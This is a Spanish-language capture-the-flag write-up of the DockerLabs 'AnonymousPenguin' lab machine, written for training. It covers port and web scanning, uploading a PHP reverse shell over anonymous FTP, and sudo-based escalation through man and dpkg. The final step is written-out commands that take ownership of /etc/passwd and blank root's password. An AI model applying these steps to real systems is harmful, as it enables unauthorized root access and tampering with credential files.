---
title: AnonymousPenguin - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | ElPinguinoDeMario | 

## Escaneo y Reconocimiento de puertos

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap.

![image](https://github.com/romabri/romabri.github.io/assets/51706860/65e4d789-ef58-4b48-b859-b660d16e62cc)


`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
- `-p-` - Busqueda de puertos abiertos
- `--open` - Enumera los puertos abiertos
- `-sS` - Es un modo de escaneo rapido
- `-sC-` - Que use un conjunto de scripts de reconocimiento
- `-sV` - Que encuentre la version del servicio abirto
- `--min-rate=5000` - Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
- `-n` - No hace resolución DNS
- `-Pn` - No hace ping
- `-vvv` - Muestra en pantalla a medida que encuentra puertos (Verbose)

Vemos que esta abierto el puerto 21 `FTP` y el puerto 80 `HTTP`

## Web
Si accedemos a la pagina web vemos lo siguiente 

![image](https://github.com/romabri/romabri.github.io/assets/51706860/a60d4c2f-4f5d-4c84-a802-68365148a8b2)


Usamos `Gobuster` para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.20.10.5/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre


![image](https://github.com/romabri/romabri.github.io/assets/51706860/cbdf14b6-a616-4c7d-9378-d264b5ed6721)

Vemos que hay un directorio upload pero no hay nada dentro vamos a intentar subir desde el ftp una reverse shell a la carpeta upload y asi conseguir acceso al PC

Vemos que hemos podido subir el archivo de la reverse shell php 

## FTP

`ftp 172.17.0.2`

Accedemos como anonymous

![image](https://github.com/romabri/romabri.github.io/assets/51706860/07811535-c2e2-49f0-88a4-b5b7de20e9e6)

Y en el directorio web upload también aparace

Entonces en este directorio vamos a subir un php reverse shell de las `webshells`

![image](https://github.com/romabri/romabri.github.io/assets/51706860/87855e3d-31db-4c4a-97fb-77a5b3597be7)

Vamos a ponernos en escucha con NetCat

![image](https://github.com/romabri/romabri.github.io/assets/51706860/d3d92202-f99f-4a93-9800-52353cfb2cb3)


## Intrusión Maquina

Ya estamos dentro de la maquina 
Si ejecutamos un sudo -l vemos ue podemos ejecutar man como Pingu para ello hemos de hacer lo siguiente:

![image](https://github.com/romabri/romabri.github.io/assets/51706860/b31ce2ed-bd3a-4cc0-988c-2f65d8e1a4fd)

Usamos sudo -u pingu para ejecutar el binario man como ese usuario

Ahora si desde el usuairo pingu ejecutamos sudo -l podemos ejecutar nmpa y dpkg como el usuario gladys

![image](https://github.com/romabri/romabri.github.io/assets/51706860/ae1094b1-a720-4478-b727-412face2d07f)

Vamos a usar dpkg para la escalada a gladys

![image](https://github.com/romabri/romabri.github.io/assets/51706860/ddfdc958-583e-4895-a2a2-fea73df5ccf7)

Por ultimo si ejecutamos un sudo -l desde el usuario gladys vemos que podemos ejecutar chown como root 


![image](https://github.com/romabri/romabri.github.io/assets/51706860/4c74f69a-7702-4968-a353-5a22faa8b79a)


Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:

`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`

Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.

`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`

Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba

`cp /tmp/passwd.tmp /etc/passwd`

Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña

![image](https://github.com/romabri/romabri.github.io/assets/51706860/85cce3f6-7b30-4f28-981f-55b8e6eaa4b2)







